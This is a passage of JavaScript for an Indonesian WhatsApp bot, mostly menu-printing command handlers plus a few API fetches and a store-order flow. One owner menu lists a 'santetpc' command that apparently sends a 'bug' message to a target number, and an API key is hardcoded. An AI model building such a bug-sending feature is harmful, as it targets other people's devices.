	    {title: "「 🎱 」 GAME", rowId: ".menugame", description: "Melihat Command untuk Fitur Game"},
	    {title: "「 🫳 」 DOWNLOADER", rowId: ".menudownloader", description: "Melihat Command untuk Fitur Downloader"},
	    {title: "「 🛠️ 」 TOOLS", rowId: ".menutools", description: "Melihat Command untuk Fitur Tools"},
	    {title: "「 🔀 」 RANDOM", rowId: ".menurandom", description: "Melihat Command untuk Fitur Random"},
	    {title: "「 🔎 」 SEARCH", rowId: ".menusearch", description: "Melihat Command untuk Fitur Search"},
	    {title: "「 🎙️ 」 VOCAL", rowId: ".menuvocal", description: "Melihat Command untuk Fitur Vocal"},
	    {title: "「 🎼 」 AUDIO", rowId: ".menuaudio", description: "Melihat Command untuk Fitur Audio"},
	    {title: "「 🥳 」 FUNCEK", rowId: ".menufuncek", description: "Melihat Command untuk Fitur Fun Cek"},
	    {title: "「 📖 」 PRIMBON", rowId: ".menuprimbon", description: "Melihat Command untuk Fitur Primbon"},
	    {title: "「 🧩 」 TEXTPRO", rowId: ".menutextpro", description: "Melihat Command untuk Fitur Text Pro"},
	    {title: "「 🔞 」 NSFW", rowId: ".menunsfw", description: "Melihat Command untuk Fitur NSFW"},
	    {title: "「 🖼️ 」 PHOTO OXY", rowId: ".menuphotooxy", description: "Melihat Command untuk Fitur Photo Oxy"},
	    {title: "「 📸 」 PHOTO 360", rowId: ".menuphoto360", description: "Melihat Command untuk Fitur Photo 360"},
	    {title: "「 🤭 」 STALKING", rowId: ".menustalking", description: "Melihat Command untuk Fitur Stalking"},
	    {title: "「 🕋 」 ISLAMIC", rowId: ".menuislam", description: "Melihat Command untuk Fitur Islam"},
	    {title: "「 🧒 」 WIBU", rowId: ".menuwibu", description: "Melihat Command untuk Fitur Wibu"},
	    {title: "「 ✍️ 」 RANDOM TEXT", rowId: ".menurandomtext", description: "Melihat Command untuk Fitur Random Text"},
	    {title: "「 🎥 」 MOVIE", rowId: ".menumovie", description: "Melihat Command untuk Fitur Movie"},
	    {title: "「 🤫 」 LESSON", rowId: ".menulesson", description: "Melihat Command untuk Fitur Lesson"},
	    {title: "「 🅰️ 」 RANDOM", rowId: ".menurandom", description: "Melihat Command untuk Fitur Random"},
	]
    },
	{
	title: "Pembelian & Sewa",
	rows: [
	    {title: "SEWA BOT", rowId: ".sewabot", description: "Untuk Sewa BOT"},
	    {title: "JADI BOT", rowId: ".jadibot", description: "Untuk yang ingin menjadi Owner BOT"},
	    {title: "SEWA PANEL/RDP/VPS", rowId: ".sewapanel", description: "Comming Son"},
	    {title: "BELI SOURCE CODE", rowId: ".belisc", description: "Untuk Pembelian SC (Developer Only)"},
	]
    },
	{
	title: "Info Lainnya",
	rows: [
	    {title: "PERTANYAAN DAN BOT INI", rowId: ".faq", description: "This Whastapp BOT can only be used by Whatsapp Users/Numbers from Indonesia!"},
	    {title: "KATA PENUTUP", rowId: ".penutup", description: "Terimakasih untuk Users yang telah menggunakan BOT, jika ada kesalahan atau permintaan fitur silahkan Hubungi Owner"},
	]
    },
]
const listMessage = {
  text: `Hai Kak ${pushname !== undefined ? pushname : 'Kak'}
Pilih Menu YUDHA BOT Disini`,
      footer: 'Jangan Lupa Donasi Ya Kak',
      title: `${ucapanWaktu}`,
      buttonText: "Pilih Disini",
      sections
}

await Manik.sendMessage(m.chat, buttonMessage)
await Manik.sendMessage(m.chat, listMessage)
	
	
	break
}

//COBA
case prefix+'coba': {
	addCountCmd(`#${command.slice(1)}`, sender, _cmd)
	try {//mencoba
           ppuser = await Manik.profilePictureUrl('image')
         } catch {//jika foto profil tidak tersedia maka akan dialihkan ke link dibawah sebagai gambar pengganti
           ppuser = 'https://telegra.ph/file/265c672094dfa87caea19.jpg'
         }

			let wel = api('lol', '/api/base/welcome', {
								apikey: `SadTeams`,
								img1: ppuser,
								img2: 'https://i.postimg.cc/CM34YRFb/photo-2021-02-05-10-13-39.jpg',
								background: 'https://i.ibb.co/8B6Q84n/LTqHsfYS.jpg',
								username: `1`,
								member: `1`,
								groupname: `1`
								
                            })
let cv = `Selamat Datang Kak \ndi Group \n\nBoleh Perkenalan Kak..\n\n_Ketik_ *.menu* _untuk melihat item Group_`							
await Manik.sendFile(m.chat, wel, null, cv, 0)
	
	break
}




//INFO GEMPA
case prefix+'infogempa': {
	addCountCmd(`#${command.slice(1)}`, sender, _cmd)
	let cun = await fetchJson(`https://api.lolhuman.xyz/api/infogempa?apikey=SadTeams`)
	let tt = cun.result
	let bb = `*INFO GEMPA TERKINI !*

 Waktu:\n *${tt.waktu}*
 Magnitude:\n *${tt.magnitude}*
 Kedalaman:\n *${tt.kedalaman}*
 Koordinat:\n *${tt.koordinat}*
 Lokasi:\n *${tt.lokasi}*
 
 *${tt.potensi}*
 
 
 `
	await Manik.sendFile(m.chat, `${tt.map}`, null, bb, 0)
	break
}

//MENU GROUP
case prefix+'menugroup': {
addCountCmd(`#${command.slice(1)}`, sender, _cmd)
let cot = `*── 「 COMMAND GROUP 」 ──*
 
 ❒͡  ${prefix}linkgroup
 ❒͡  ${prefix}antilink [on/off]
 ❒͡  ${prefix}antiyt [on/off]
 ❒͡  ${prefix}antibitly [on/off]
 ❒͡  ${prefix}antibadword [on/off]
 ❒͡  ${prefix}ephemeral [option]
 ❒͡  ${prefix}setppgc [image]
 ❒͡  ${prefix}setname [text]
 ❒͡  ${prefix}setdesc [text]
 ❒͡  ${prefix}group [buka/tutup]
 ❒͡  ${prefix}editinfo [option]
 ❒͡  ${prefix}add @tag _(Not Active)_
 ❒͡  ${prefix}kick @tag _(Not Active)_
 ❒͡  ${prefix}hidetag [text]
 ❒͡  ${prefix}tagall [text]
 ❒͡  ${prefix}promote @tag
 ❒͡  ${prefix}demote @tag
 ❒͡  ${prefix}vote [text]
 ❒͡  ${prefix}devote
 ❒͡  ${prefix}upvote
 ❒͡  ${prefix}cekvote
 ❒͡  ${prefix}hapusvote
 ❒͡  ${prefix}ceksewa
 
 `
 
 Manik.sendMessage(m.chat, {text: cot})
 
}
break	
//MENU OWNER 
case prefix+'menuowner': {
addCountCmd(`#${command.slice(1)}`, sender, _cmd)
let cot = `*── 「 COMMAND OWNER 」 ──*
 
  ❒͡  ${prefix}chat [option]
  ❒͡  ${prefix}getcase [name]
  ❒͡  ${prefix}join [link]
  ❒͡  ${prefix}leave
  ❒͡  ${prefix}setbotpp
  ❒͡  ${prefix}block @user
  ❒͡  ${prefix}unblock @user
  ❒͡  ${prefix}bcgroup
  ❒͡  ${prefix}bcall
  ❒͡  ${prefix}self
  ❒͡  ${prefix}public
  ❒͡  ${prefix}setcmd
  ❒͡  ${prefix}listcmd
  ❒͡  ${prefix}delcmd
  ❒͡  ${prefix}lockcmd
  ❒͡  ${prefix}addmsg
  ❒͡  ${prefix}listmsg
  ❒͡  ${prefix}getmsg
  ❒͡  ${prefix}delmsg
 
 `
 
 Manik.sendMessage(m.chat, {text: cot})
 
}
break

//MENU SENDBUG 
case prefix+'sendbug': {
addCountCmd(`#${command.slice(1)}`, sender, _cmd)
let cot = `*── 「 COMMAND OWNER 」 ──*
 
  ❒͡  ${prefix}santetpc <notujuan>
 
 `
 
 Manik.sendMessage(m.chat, {text: cot})
 
}
break


 //MENU GAME 
case prefix+'menugame': {
addCountCmd(`#${command.slice(1)}`, sender, _cmd)
let cot = `*── 「 COMMAND FUN GAME 」 ──*
   	
 ❒͡  ${prefix}piatu
 ❒͡  ${prefix}holoh
 ❒͡  ${prefix}jadian
 ❒͡  ${prefix}jodohku
 ❒͡  ${prefix}delttt
 ❒͡  ${prefix}tictactoe
 ❒͡  ${prefix}family100
 ❒͡  ${prefix}tebak [option]
 ❒͡  ${prefix}math [mode]
 ❒͡  ${prefix}suitpvp [@tag]
 ❒͡  ${prefix}casino
 ❒͡  ${prefix}delcasino
 ❒͡  ${prefix}akinator
 ❒͡  ${prefix}cancelakinator
 ❒͡  ${prefix}adunasib
 
 `
 
 Manik.sendMessage(m.chat, {text: cot})
 
}
break 

//MENU Download
case prefix+'menudownloader': {
addCountCmd(`#${command.slice(1)}`, sender, _cmd)
let cot = `*── 「 COMMAND DOWNLOADER 」 ──*
   	
 ❒͡  ${prefix}tiktok [url]
 ❒͡  ${prefix}tiktokaudio [url]
 ❒͡  ${prefix}tiktoknowm [url]     
 ❒͡  ${prefix}instagram [url]
 ❒͡  ${prefix}twitter [url]
 ❒͡  ${prefix}twittermp3 [url]
 ❒͡  ${prefix}facebook [url]
 ❒͡  ${prefix}pinterestdl [url]
 ❒͡  ${prefix}ytmp3 [url]
 ❒͡  ${prefix}ytmp4 [url]
 ❒͡  ${prefix}getmusic [query]
 ❒͡  ${prefix}getvideo [query]
 ❒͡  ${prefix}umma [url]
 ❒͡  ${prefix}joox [query]
 ❒͡  ${prefix}soundcloud [url]
 ❒͡  ${prefix}ttnowm [url] 
 ❒͡  ${prefix}ttaudio [url]
 
 `
 
 Manik.sendMessage(m.chat, {text: cot})
 
}
break

//MENU TOOLS 
case prefix+'menutools': {
addCountCmd(`#${command.slice(1)}`, sender, _cmd)
let cot = `*── 「 COMMAND TOOLS 」 ──*
   	
 ❒͡  ${prefix}toimage
 ❒͡  ${prefix}removebg
 ❒͡  ${prefix}sticker
 ❒͡  ${prefix}emojimix
 ❒͡  ${prefix}tovideo
 ❒͡  ${prefix}togif
 ❒͡  ${prefix}tourl
 ❒͡  ${prefix}tovn
 ❒͡  ${prefix}tomp3
 ❒͡  ${prefix}toaudio
 ❒͡  ${prefix}ebinary
 ❒͡  ${prefix}dbinary
 
 `
 
 Manik.sendMessage(m.chat, {text: cot})
 
}
break

//SEND2BUTTONLOC
case prefix+'locc': {
addCountCmd(`#${command.slice(1)}`, sender, _cmd)
Manik.send2ButtonLoc(m.chat, 'https://telegra.ph/file/cf60b26d891aab29019ac.jpg', 'tes', 'button', 'lagi', 'button2', 'lagi', m)
}
break






//MENU RANDOM 
case prefix+'menurandom': {
addCountCmd(`#${command.slice(1)}`, sender, _cmd)
let cot = `*── 「 COMMAND RANDOM 」 ──*
   	
 ❒͡  ${prefix}coffe
 ❒͡  ${prefix}quotesanime
 ❒͡  ${prefix}motivasi
 ❒͡  ${prefix}dilanquote
 ❒͡  ${prefix}bucinquote
 ❒͡  ${prefix}katasenja
 ❒͡  ${prefix}puisi
 ❒͡  ${prefix}ppcp
 ❒͡  ${prefix}anime
 ❒͡  ${prefix}waifu
 ❒͡  ${prefix}husbu
 ❒͡  ${prefix}neko
 ❒͡  ${prefix}shinobu
 ❒͡  ${prefix}megumin
 ❒͡  ${prefix}loli
 
 `
 
 Manik.sendMessage(m.chat, {text: cot})
 
}
break
//MENU SEARCH 
case prefix+'menusearch': {
addCountCmd(`#${command.slice(1)}`, sender, _cmd)
let cot = `*── 「 COMMAND SEARCH 」 ──*
   	
 ❒͡  ${prefix}play [query]
 ❒͡  ${prefix}yts [query]
 ❒͡  ${prefix}google [query]
 ❒͡  ${prefix}gimage [query]
 ❒͡  ${prefix}pinterest [query]
 ❒͡  ${prefix}wallpaper [query]
 ❒͡  ${prefix}wikimedia [query]
 ❒͡  ${prefix}ytsearch [query]
 ❒͡  ${prefix}ringtone [query]
 ❒͡  ${prefix}nickff 
 ❒͡  ${prefix}nickml
 ❒͡  ${prefix}nickpubg
 ❒͡  ${prefix}nickdomino
 
 `
 
 Manik.sendMessage(m.chat, {text: cot})
 
}
break

//MENU VOCAL
case prefix+'menuvocal': {
addCountCmd(`#${command.slice(1)}`, sender, _cmd)
let cot = `*── 「 COMMAND VOCAL 」 ──*
   	
 ❒͡  ${prefix}halah
 ❒͡  ${prefix}hilih
 ❒͡  ${prefix}huluh
 ❒͡  ${prefix}heleh
 ❒͡  ${prefix}holoh
 
 `
 
 Manik.sendMessage(m.chat, {text: cot})
 
}
break

//MENU AUDIO
case prefix+'menuaudio': {
addCountCmd(`#${command.slice(1)}`, sender, _cmd)
let cot = `*── 「 COMMAND AUDIO 」 ──*
   	
 ❒͡  ${prefix}bass
 ❒͡  ${prefix}blown
 ❒͡  ${prefix}deep
 ❒͡  ${prefix}earrape
 ❒͡  ${prefix}fast
 ❒͡  ${prefix}fat
 ❒͡  ${prefix}nightcore
 ❒͡  ${prefix}reverse
 ❒͡  ${prefix}robot
 ❒͡  ${prefix}slow
 ❒͡  ${prefix}squirrel
 
 `
 
 Manik.sendMessage(m.chat, {text: cot})
 
}
break

//MENU FUN CEK 
case prefix+'menufuncek': {
addCountCmd(`#${command.slice(1)}`, sender, _cmd)
let cot = `*── 「 COMMAND FUN CEK 」 ──*
   	
 ❒͡  ${prefix}goblokcek 
 ❒͡  ${prefix}jelekcek 
 ❒͡  ${prefix}rate
 ❒͡  ${prefix}haram
 ❒͡  ${prefix}gaycek
 ❒͡  ${prefix}lesbicek
 ❒͡  ${prefix}gantengcek 
 ❒͡  ${prefix}cantikcek
 ❒͡  ${prefix}begocek 
 ❒͡  ${prefix}suhucek
 ❒͡  ${prefix}pintercek
 ❒͡  ${prefix}jagocek
 ❒͡  ${prefix}nolepcek
 ❒͡  ${prefix}babicek
 ❒͡  ${prefix}bebancek
 ❒͡  ${prefix}baikcek
 ❒͡  ${prefix}jahatcek
 ❒͡  ${prefix}anjingcek
 ❒͡  ${prefix}haramcek
 ❒͡  ${prefix}pakboycek
 ❒͡  ${prefix}pakgirlcek
 ❒͡  ${prefix}sangecek 
 ❒͡  ${prefix}bapercek
 ❒͡  ${prefix}fakboycek
 ❒͡  ${prefix}alimcek
 ❒͡  ${prefix}suhucek
 ❒͡  ${prefix}fakgirlcek
 ❒͡  ${prefix}kerencek
 ❒͡  ${prefix}wibucek
 ❒͡  ${prefix}pasarkascek
 
 `
 
 Manik.sendMessage(m.chat, {text: cot})
 
}
break

//MENU PRIMBON 
case prefix+'menuprimbon': {
addCountCmd(`#${command.slice(1)}`, sender, _cmd)
let cot = `*── 「 COMMAND FUN CEK 」 ──*

 ❒͡  ${prefix}nomorhoki
 ❒͡  ${prefix}artimimpi
 ❒͡  ${prefix}artinama
 ❒͡  ${prefix}ramaljodoh
 ❒͡  ${prefix}ramaljodohbali
 ❒͡  ${prefix}suamiistri
 ❒͡  ${prefix}ramalcinta
 ❒͡  ${prefix}cocoknama
 ❒͡  ${prefix}pasangan
 ❒͡  ${prefix}jadiannikah
 ❒͡  ${prefix}sifatusaha
 ❒͡  ${prefix}rezeki
 ❒͡  ${prefix}pekerjaan
 ❒͡  ${prefix}nasib
 ❒͡  ${prefix}penyakit
 ❒͡  ${prefix}tarot
 ❒͡  ${prefix}fengshui
 ❒͡  ${prefix}haribaik
 ❒͡  ${prefix}harisangar
 ❒͡  ${prefix}harisial
 ❒͡  ${prefix}nagahari
 ❒͡  ${prefix}arahrezeki
 ❒͡  ${prefix}peruntungan
 ❒͡  ${prefix}weton
 ❒͡  ${prefix}karakter
 ❒͡  ${prefix}keberuntungan
 ❒͡  ${prefix}memancing
 ❒͡  ${prefix}masasubur
 ❒͡  ${prefix}zodiak
 ❒͡  ${prefix}shio
 
 `
 
 Manik.sendMessage(m.chat, {text: cot})
 
}
break

//MENU TEXTPRO
case prefix+'menutextpro': {
addCountCmd(`#${command.slice(1)}`, sender, _cmd)
let cot = `*── 「 COMMAND TEXT PRO 」 ──*

 ❒͡  ${prefix}blackpink text
 ❒͡  ${prefix}neon text
 ❒͡  ${prefix}greenneon text
 ❒͡  ${prefix}advanceglow text
 ❒͡  ${prefix}futureneon text
 ❒͡  ${prefix}sandwriting text
 ❒͡  ${prefix}sandsummer text
 ❒͡  ${prefix}sandengraved text
 ❒͡  ${prefix}metaldark text
 ❒͡  ${prefix}neonlight text
 ❒͡  ${prefix}holographic text
 ❒͡  ${prefix}text1917 text
 ❒͡  ${prefix}minion text
 ❒͡  ${prefix}deluxesilver text
 ❒͡  ${prefix}newyearcard text
 ❒͡  ${prefix}bloodfrosted text
 ❒͡  ${prefix}halloween text
 ❒͡  ${prefix}jokerlogo text
 ❒͡  ${prefix}fireworksparkle text
 ❒͡  ${prefix}natureleaves text
 ❒͡  ${prefix}bokeh text
 ❒͡  ${prefix}toxic text
 ❒͡  ${prefix}strawberry text
 ❒͡  ${prefix}box3d text
 ❒͡  ${prefix}roadwarning text
 ❒͡  ${prefix}breakwall text
 ❒͡  ${prefix}icecold text
 ❒͡  ${prefix}luxury text
 ❒͡  ${prefix}cloud text
 ❒͡  ${prefix}summersand text
 ❒͡  ${prefix}horrorblood text
 ❒͡  ${prefix}thunder text
 ❒͡  ${prefix}pornhub text1 text2
 ❒͡  ${prefix}glitch text1 text2
 ❒͡  ${prefix}avenger text1 text2
 ❒͡  ${prefix}space text1 text2
 ❒͡  ${prefix}ninjalogo text1 text2
 ❒͡  ${prefix}marvelstudio text1 text2
 ❒͡  ${prefix}lionlogo text1 text2
 ❒͡  ${prefix}wolflogo text1 text2
 ❒͡  ${prefix}steel3d text1 text2
 ❒͡  ${prefix}wallgravity text1 text2
 
 `
 
 Manik.sendMessage(m.chat, {text: cot})
 
}
break

//MENU NSFW 
case prefix+'menunsfw': {
addCountCmd(`#${command.slice(1)}`, sender, _cmd)
let cot = `*── 「 COMMAND NSFW 」 ──*

 ❒͡  ${prefix}chiisaihentai
 ❒͡  ${prefix}trap
 ❒͡  ${prefix}blowjob
 ❒͡  ${prefix}yaoi
 ❒͡  ${prefix}ecchi
 ❒͡  ${prefix}hentai
 ❒͡  ${prefix}ahegao
 ❒͡  ${prefix}hololewd
 ❒͡  ${prefix}sideoppai
 ❒͡  ${prefix}animefeets
 ❒͡  ${prefix}animebooty
 ❒͡  ${prefix}animethighss
 ❒͡  ${prefix}hentaiparadise
 ❒͡  ${prefix}animearmpits
 ❒͡  ${prefix}hentaifemdom
 ❒͡  ${prefix}lewdanimegirls
 ❒͡  ${prefix}biganimetiddies
 ❒͡  ${prefix}animebellybutton
 ❒͡  ${prefix}hentai4everyone
 
 `
 
 Manik.sendMessage(m.chat, {text: cot})
 
}
break

//MENU RANDOM IMAGE 
case prefix+'menurandomimage': {
addCountCmd(`#${command.slice(1)}`, sender, _cmd)
let cot = `*── 「 COMMAND RANDOM IMAGE 」 ──*

 ❒͡  ${prefix}bj
 ❒͡  ${prefix}ero
 ❒͡  ${prefix}ppcp
 ❒͡  ${prefix}cum
 ❒͡  ${prefix}feet
 ❒͡  ${prefix}yuri
 ❒͡  ${prefix}trap
 ❒͡  ${prefix}lewd
 ❒͡  ${prefix}feed
 ❒͡  ${prefix}eron
 ❒͡  ${prefix}solo
 ❒͡  ${prefix}gasm
 ❒͡  ${prefix}poke
 ❒͡  ${prefix}anal
 ❒͡  ${prefix}holo
 ❒͡  ${prefix}tits
 ❒͡  ${prefix}kuni
 ❒͡  ${prefix}kiss
 ❒͡  ${prefix}erok
 ❒͡  ${prefix}smug
 ❒͡  ${prefix}baka
 ❒͡  ${prefix}solog
 ❒͡  ${prefix}feetg
 ❒͡  ${prefix}lewdk
 ❒͡  ${prefix}waifu
 ❒͡  ${prefix}pussy
 ❒͡  ${prefix}femdom
 ❒͡  ${prefix}cuddle
 ❒͡  ${prefix}hentai
 ❒͡  ${prefix}eroyuri
 ❒͡  ${prefix}cum_jpg
 ❒͡  ${prefix}blowjob
 ❒͡  ${prefix}erofeet
 ❒͡  ${prefix}holoero
 ❒͡  ${prefix}classic
 ❒͡  ${prefix}erokemo
 ❒͡  ${prefix}fox_girl
 ❒͡  ${prefix}futanari
 ❒͡  ${prefix}lewdkemo
 ❒͡  ${prefix}wallpaper
 ❒͡  ${prefix}pussy_jpg
 ❒͡  ${prefix}kemonomimi
 ❒͡  ${prefix}nsfw_avatar
 ❒͡  ${prefix}ngif
 ❒͡  ${prefix}nsfw_neko_gif
 ❒͡  ${prefix}random_hentai_gif
 
 `
 
 Manik.sendMessage(m.chat, {text: cot})
 
}
break

//MENU PHOTO OXY
case prefix+'menuphotooxy': {
addCountCmd(`#${command.slice(1)}`, sender, _cmd)
let cot = `*── 「 COMMAND PHOTO OXY 」 ──*

 ❒͡  ${prefix}shadow text
 ❒͡  ${prefix}cup text
 ❒͡  ${prefix}cup1 text
 ❒͡  ${prefix}romance text
 ❒͡  ${prefix}smoke text
 ❒͡  ${prefix}burnpaper text
 ❒͡  ${prefix}lovemessage text
 ❒͡  ${prefix}undergrass text
 ❒͡  ${prefix}love text
 ❒͡  ${prefix}coffe text
 ❒͡  ${prefix}woodheart text
 ❒͡  ${prefix}woodenboard text
 ❒͡  ${prefix}summer3d text
 ❒͡  ${prefix}wolfmetal text
 ❒͡  ${prefix}nature3d text
 ❒͡  ${prefix}underwater text
 ❒͡  ${prefix}goldenrose text
 ❒͡  ${prefix}summernature text
 ❒͡  ${prefix}letterleaves text
 ❒͡  ${prefix}glowingneon text
 ❒͡  ${prefix}fallleaves text
 ❒͡  ${prefix}flamming text
 ❒͡  ${prefix}harrypotter text
 ❒͡  ${prefix}carvedwood text
 ❒͡  ${prefix}tiktok text1 text2
 ❒͡  ${prefix}arcade8bit text1 text2
 ❒͡  ${prefix}battlefield4 text1 text2
 ❒͡  ${prefix}pubg text1 text2
 
 `
 
 Manik.sendMessage(m.chat, {text: cot})
 
}
break

////Pesanan
case prefix+'pesanan': {
addCountCmd(`#${command.slice(1)}`, sender, _cmd)
let a = await Manik.groupMetadata(from)
let resp = `*BUY CONFIRMATION*\n\nHai Admin *${a.subject}*,\n\nPembeli: ${sender}\nItem: ${text}\n\nSegera Konfirmasi !`
let res = `*BUY CONFIRMATION*\n\nPembelian ${text} telah di konfirmasi kepada Admin Group ${a.subject}\n\nSilahkan Tunggu....`
let cc = `Transaksimu telah di konfirmasi\nMohon Tunggu....`


await Manik.sendMessage(m.chat, { text: cc })
await Manik.send2Button(`${a.owner}`, resp, `Klik Proses Untuk Proses! atau Stok Habis!`, 'PROSES', `.prosesx ${sender} ${text} `, 'STOK HABIS', '.habis', 0)
await Manik.sendMessage(sender, { text: res })
}
break

//HABIS 
case prefix+'habis': {
	
}
break



//MENU PHOTO 360
case prefix+'menuphoto360': {
addCountCmd(`#${command.slice(1)}`, sender, _cmd)
let cot = `*── 「 COMMAND PHOTO 360 」 ──*

 ❒͡  ${prefix}wetglass text
 ❒͡  ${prefix}multicolor3d text
 ❒͡  ${prefix}watercolor text
 ❒͡  ${prefix}luxurygold text
 ❒͡  ${prefix}galaxywallpaper text
 ❒͡  ${prefix}lighttext text
 ❒͡  ${prefix}beautifulflower text
 ❒͡  ${prefix}puppycute text
 ❒͡  ${prefix}royaltext text
 ❒͡  ${prefix}heartshaped text
 ❒͡  ${prefix}birthdaycake text
 ❒͡  ${prefix}galaxystyle text
 ❒͡  ${prefix}hologram3d text
 ❒͡  ${prefix}greenneon text
 ❒͡  ${prefix}glossychrome text
 ❒͡  ${prefix}greenbush text
 ❒͡  ${prefix}metallogo text
 ❒͡  ${prefix}noeltext text
 ❒͡  ${prefix}glittergold text
 ❒͡  ${prefix}textcake text
 ❒͡  ${prefix}starsnight text
 ❒͡  ${prefix}wooden3d text
 ❒͡  ${prefix}textbyname text
 ❒͡  ${prefix}writegalacy text
 ❒͡  ${prefix}galaxybat text
 ❒͡  ${prefix}snow3d text
 ❒͡  ${prefix}birthdayday text
 ❒͡  ${prefix}goldplaybutton text
 ❒͡  ${prefix}silverplaybutton text
 ❒͡  ${prefix}freefire text
 
 `
 
 Manik.sendMessage(m.chat, {text: cot})
 
}
break
//MENU BOT 
case prefix+'menubot': {
addCountCmd(`#${command.slice(1)}`, sender, _cmd)
let cot = `*── 「 COMMAND BOT SETTINGS 」 ──*

 ❒͡  ${prefix}antilink On/Off
 ❒͡  ${prefix}mute On/Off
 ❒͡  ${prefix}antiwame On/Off
 ❒͡  ${prefix}antiyt On/Off
 ❒͡  ${prefix}antitele On/Off
 ❒͡  ${prefix}antibitly On/Off
 
 `
 
 Manik.sendMessage(m.chat, {text: cot})
 
}
break

//MENU STALKING
case prefix+'menustalking': {
addCountCmd(`#${command.slice(1)}`, sender, _cmd)
let cot = `*── 「 COMMAND STALKING 」 ──*

 ❒͡  ${prefix}stalkig    _<nama>_
 ❒͡  ${prefix}stalkgithub    _<nama>_
 ❒͡  ${prefix}stalktwitter    _<nama>_
 ❒͡  ${prefix}mlstalk    _<nama>_
 
 `
 
 Manik.sendMessage(m.chat, {text: cot})
 
}
break

//MENU ISLAM 
case prefix+'menuislam': {
addCountCmd(`#${command.slice(1)}`, sender, _cmd)
let cot = `*── 「 COMMAND ISLAMIC 」 ──*

 ❒͡  ${prefix}iqra
 ❒͡  ${prefix}hadith
 ❒͡  ${prefix}alquran
 ❒͡  ${prefix}juzamma
 ❒͡  ${prefix}tafsirsurah
 
 `
 
 Manik.sendMessage(m.chat, {text: cot})
 
}
break

//MENU WIBU 
case prefix+'menuwibu': {
addCountCmd(`#${command.slice(1)}`, sender, _cmd)
let cot = `*── 「 COMMAND WIBU 」 ──*

 ❒͡  ${prefix}manga
 ❒͡  ${prefix}anime 
 ❒͡  ${prefix}videoanime
 ❒͡  ${prefix}husbu
 ❒͡  ${prefix}waifu
 ❒͡  ${prefix}milf
 ❒͡  ${prefix}neko
 ❒͡  ${prefix}kanna
 ❒͡  ${prefix}sagiri
 ❒͡  ${prefix}hentai
 ❒͡  ${prefix}cosplay
 ❒͡  ${prefix}wallnime
 ❒͡  ${prefix}kusonime
 ❒͡  ${prefix}megumin
 ❒͡  ${prefix}otakudesu
 ❒͡  ${prefix}doujindesu
 ❒͡  ${prefix}storyanime
 ❒͡  ${prefix}nakanomiku
 ❒͡  ${prefix}nakanonino
 ❒͡  ${prefix}nakanoitsuki
 ❒͡  ${prefix}otakuongoing
 ❒͡  ${prefix}nhentai *code*
 ❒͡  ${prefix}nekopoi *link*
 ❒͡  ${prefix}nekopoisearch
 
 `
 
 Manik.sendMessage(m.chat, {text: cot})
 
}
break

//MENU RANDOM TEXT 
case prefix+'menurandomtext': {
addCountCmd(`#${command.slice(1)}`, sender, _cmd)
let cot = `*── 「 COMMAND RANDOM TEXT 」 ──*

 ❒͡  ${prefix}quotes
 ❒͡  ${prefix}quotesdiLan
 ❒͡  ${prefix}quotesanime
 ❒͡  ${prefix}quotesimage
 ❒͡  ${prefix}faktaunik
 ❒͡  ${prefix}katabijak
 ❒͡  ${prefix}pantun
 ❒͡  ${prefix}bucin
 ❒͡  ${prefix}randomnama
 
 `
 
 Manik.sendMessage(m.chat, {text: cot})
 
}
break

//MENU MOVIE 
case prefix+'menumovie': {
addCountCmd(`#${command.slice(1)}`, sender, _cmd)
let cot = `*── 「 COMMAND MOVIE 」 ──*

 ❒͡  ${prefix}drakorongoing
 ❒͡  ${prefix}lk21 query
 ❒͡  ${prefix}wattpad url_wattpad
 ❒͡  ${prefix}wattpadsearch query
 ❒͡  ${prefix}cerpen
 ❒͡  ${prefix}ceritahoror
 
 `
 
 Manik.sendMessage(m.chat, {text: cot})
 
}
break

//MENU LESSON 
case prefix+'menulesson': {
addCountCmd(`#${command.slice(1)}`, sender, _cmd)
let cot = `*── 「 COMMAND LESSON 」 ──*
    
 ❒͡  ${prefix}addtugas
 ❒͡  ${prefix}resettugas
 ❒͡  ${prefix}outputtugas
 ❒͡  ${prefix}hapustugas
 ❒͡  ${prefix}addjudultugas
 ❒͡  ${prefix}tambah
 ❒͡  ${prefix}kali
 ❒͡  ${prefix}kurang
 ❒͡  ${prefix}bagi
 
 `
 
 Manik.sendMessage(m.chat, {text: cot})
 
}
break

//MENU STORE 
/*case prefix+'menustore': {
addCountCmd(`#${command.slice(1)}`, sender, _cmd)
let cot = `*── 「 COMMAND STORE MENU 」 ──*
    
 ❒͡  ${prefix}item
 ❒͡  ${prefix}tambahitem
 ❒͡  ${prefix}hapusitem
 ❒͡  ${prefix}ubahitem
 
 `
 
 Manik.sendMessage(m.chat, {text: cot})
 
}
break*/

//MENU ADMIN
case prefix+'admin':
case prefix+'menustore':{
	addCountCmd(`#${command.slice(1)}`, sender, _cmd)
	if (!m.isGroup) return reply(mess.group)
    if (!m.isGroup) return reply(mess.OnlyGrup)
    if (!isAdmins && !isManik) return reply('Only Admins')
	const sections = [
    {
	title: 'Fitur Store',
	rows: [
	    {title: "TAMBAH ITEM", rowId: ".tambahitem", description: "Untuk Menambah Item"},
	    {title: "UBAH ITEM", rowId: ".ubahitem", description: "Untuk Mengubah Item"},
	    {title: "HAPUS ITEM", rowId: ".hapusitem2", description: "Untuk Menghapus Item"},
	    {title: "INPUT REKENING", rowId: ".inputrekening", description: "Belum Tersedia !"},
	]
    },{
	title: 'Fitur Tambahan',
	rows: [
	    {title: "ANTILINK GROUP", rowId: ".antilink", description: "Untuk Mengaktifkan Anti Link Group WA"},
	    {title: "ANTILINK YOUTUBE", rowId: ".antiyt", description: "Untuk Mengaktifkan Anti Link Youtube"},
	    {title: "ANTILINK BIT.LY", rowId: ".antibitly", description: "Untuk Mengaktifkan Anti Link Bit.ly"},
	    {title: "ANTI BADWORD ", rowId: ".antibadword", description: "Untuk Mengaktifkan Anti Badword"},
	    {title: "ATUR PHOTO PROFIL GROUP", rowId: ".setppgc", description: "Untuk Mengatur Photo Profil Group"},
	    {title: "ATUR NAMA GROUP", rowId: ".setname", description: "Untuk Mengubah Nama Group"},
	    {title: "ATUR DESKRIPSI", rowId: ".setdesc", description: "Untuk Mengubah Deskripsi Group"},
	    {title: "MODE GROUP", rowId: ".group", description: "Untuk Mengatur Mode Group"},
	    {title: "ATUR DESKRIPSI", rowId: ".setdesc", description: "Untuk Mengubah Deskripsi Group"},
	]
    }
]

const listMessage = {
  text: `Hai Kak, ${pushname}\n\nBerikut Adalah Pengaturan Group !`,
  footer: "Silahkan Pilih !",
  title: `${ucapanWaktu}`,
  buttonText: "Pilih Disini !",
  sections
}

await Manik.sendMessage(m.chat, listMessage)
}
break

//MENU RIPER
case prefix+'menuriper': {
